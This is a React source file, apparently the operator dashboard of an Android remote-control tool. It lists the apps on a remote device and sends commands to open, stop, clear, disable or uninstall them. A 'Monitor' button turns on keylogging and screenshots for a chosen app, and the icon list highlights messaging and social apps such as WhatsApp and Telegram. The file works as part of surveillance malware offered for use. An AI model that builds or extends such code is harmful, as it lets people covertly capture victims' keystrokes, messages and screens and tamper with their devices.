import React, { useState, useEffect, useRef } from 'react';

const SYSTEM_ICONS = {
  'com.whatsapp': '💬',
  'com.instagram.android': '📸',
  'com.facebook.katana': '👤',
  'org.telegram.messenger': '✈️',
  'com.snapchat.android': '👻',
  'com.zhiliaoapp.musically': '🎵',
  'com.twitter.android': '🐦',
  'com.google.android.gm': '📧',
  'com.google.android.chrome': '🌐',
  'com.google.android.youtube': '▶️',
};

function getAppIcon(pkg) {
  return SYSTEM_ICONS[pkg] || '📦';
}

export default function AppManager({ device, sendCommand, results }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;

  const [apps, setApps]         = useState([]);
  const [loading, setLoading]   = useState(false);
  const [search, setSearch]     = useState('');
  const [showSystem, setShowSystem] = useState(false);
  const [sortBy, setSortBy]     = useState('name');
  const [confirmAction, setConfirmAction] = useState(null);
  const seenIds = useRef(new Set());

  const fetchApps = () => {
    setLoading(true);
    sendCommand(deviceId, 'get_installed_apps', {});
  };

  useEffect(() => {
    if (isOnline) fetchApps();
  }, [isOnline]);

  // Parse results
  useEffect(() => {
    results.forEach(r => {
      if (r.command === 'get_installed_apps' && r.success && r.response && !seenIds.current.has(r.id)) {
        seenIds.current.add(r.id);
        setLoading(false);
        try {
          const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
          const list = data.apps || data.installedApps || [];
          setApps(list);
        } catch (_) { setLoading(false); }
      }
    });
  }, [results]);

  const performAction = (action, pkg) => {
    if (['uninstall_app', 'clear_app_data', 'disable_app'].includes(action)) {
      setConfirmAction({ action, pkg });
    } else {
      sendCommand(deviceId, action, { packageName: pkg });
    }
  };

  const confirmAndExecute = () => {
    if (confirmAction) {
      sendCommand(deviceId, confirmAction.action, { packageName: confirmAction.pkg });
      setConfirmAction(null);
    }
  };

  const actionLabel = (action) => {
    switch (action) {
      case 'uninstall_app': return 'Uninstall';
      case 'clear_app_data': return 'Clear Data';
      case 'disable_app': return 'Disable';
      default: return action;
    }
  };

  let displayed = apps
    .filter(a => showSystem || !(a.isSystemApp || a.isSystem))
    .filter(a => {
      if (!search) return true;
      const q = search.toLowerCase();
      return (a.appName || a.name || '').toLowerCase().includes(q) || (a.packageName || '').toLowerCase().includes(q);
    });

  if (sortBy === 'name') {
    displayed = [...displayed].sort((a, b) => (a.appName || a.name || '').localeCompare(b.appName || b.name || ''));
  } else if (sortBy === 'package') {
    displayed = [...displayed].sort((a, b) => (a.packageName || '').localeCompare(b.packageName || ''));
  }

  return (
    <div className="app-manager">
      <div className="am-toolbar">
        <input
          className="am-search"
          placeholder="🔍 Search apps…"
          value={search}
          onChange={e => setSearch(e.target.value)}
        />
        <select className="am-sort" value={sortBy} onChange={e => setSortBy(e.target.value)}>
          <option value="name">Sort: Name</option>
          <option value="package">Sort: Package</option>
        </select>
        <label className="am-system-toggle">
          <input type="checkbox" checked={showSystem} onChange={e => setShowSystem(e.target.checked)} />
          Show System
        </label>
        <button className="am-refresh-btn" onClick={fetchApps} disabled={!isOnline || loading}>
          {loading ? '…' : '↻ Refresh'}
        </button>
      </div>

      <div className="am-stats">
        {displayed.length} apps shown {apps.length > 0 && `of ${apps.length} total`}
        {loading && <span style={{ color: '#f59e0b', marginLeft: 8 }}>Loading…</span>}
      </div>

      <div className="am-grid">
        {displayed.length === 0 && !loading && (
          <div className="am-empty">
            <div style={{ fontSize: 40 }}>📦</div>
            <div>{isOnline ? 'Click Refresh to load apps' : 'Device is offline'}</div>
          </div>
        )}
        {displayed.map(app => (
          <div key={app.packageName} className="am-app-card">
            <div className="am-app-header">
              <span className="am-app-icon">{getAppIcon(app.packageName)}</span>
              <div className="am-app-info">
                <div className="am-app-name">{app.name || app.appName || '—'}</div>
                <div className="am-app-pkg" title={app.packageName}>{app.packageName}</div>
                {app.versionName && <div className="am-app-ver">v{app.versionName}</div>}
              </div>
              {(app.isSystemApp || app.isSystem) && <span className="am-system-badge">SYS</span>}
            </div>
            <div className="am-app-actions">
              <button
                className="am-action-btn am-open"
                onClick={() => performAction('open_app', app.packageName)}
                disabled={!isOnline}
                title="Open App"
              >
                ▶ Open
              </button>
              <button
                className="am-action-btn am-stop"
                onClick={() => performAction('force_stop_app', app.packageName)}
                disabled={!isOnline}
                title="Force Stop"
              >
                ⏹ Stop
              </button>
              <button
                className="am-action-btn am-clear"
                onClick={() => performAction('clear_app_data', app.packageName)}
                disabled={!isOnline}
                title="Clear Data"
              >
                🧹 Clear
              </button>
              <button
                className="am-action-btn am-disable"
                onClick={() => performAction('disable_app', app.packageName)}
                disabled={!isOnline}
                title="Disable App"
              >
                🚫 Disable
              </button>
              <button
                className="am-action-btn am-monitor"
                onClick={() => sendCommand(deviceId, 'add_monitored_app', { packageName: app.packageName })}
                disabled={!isOnline}
                title="Monitor this app (keylog + screenshots)"
              >
                📡 Monitor
              </button>
              <button
                className="am-action-btn am-uninstall"
                onClick={() => performAction('uninstall_app', app.packageName)}
                disabled={!isOnline}
                title="Uninstall"
              >
                🗑 Uninstall
              </button>
            </div>
          </div>
        ))}
      </div>

      {confirmAction && (
        <div className="modal-overlay" onClick={() => setConfirmAction(null)}>
          <div className="modal-box" onClick={e => e.stopPropagation()}>
            <div className="modal-title">⚠️ Confirm {actionLabel(confirmAction.action)}</div>
            <div style={{ margin: '12px 0', color: '#94a3b8', fontSize: 14 }}>
              Are you sure you want to <strong style={{ color: '#ef4444' }}>{actionLabel(confirmAction.action).toLowerCase()}</strong> this app?
            </div>
            <div style={{ background: '#0f0f1a', borderRadius: 8, padding: '8px 12px', marginBottom: 16, fontFamily: 'monospace', fontSize: 13 }}>
              {confirmAction.pkg}
            </div>
            <div className="modal-actions">
              <button className="btn-secondary" onClick={() => setConfirmAction(null)}>Cancel</button>
              <button
                style={{ background: '#ef4444', color: 'white', border: 'none', padding: '8px 16px', borderRadius: 8, cursor: 'pointer' }}
                onClick={confirmAndExecute}
              >
                {actionLabel(confirmAction.action)}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
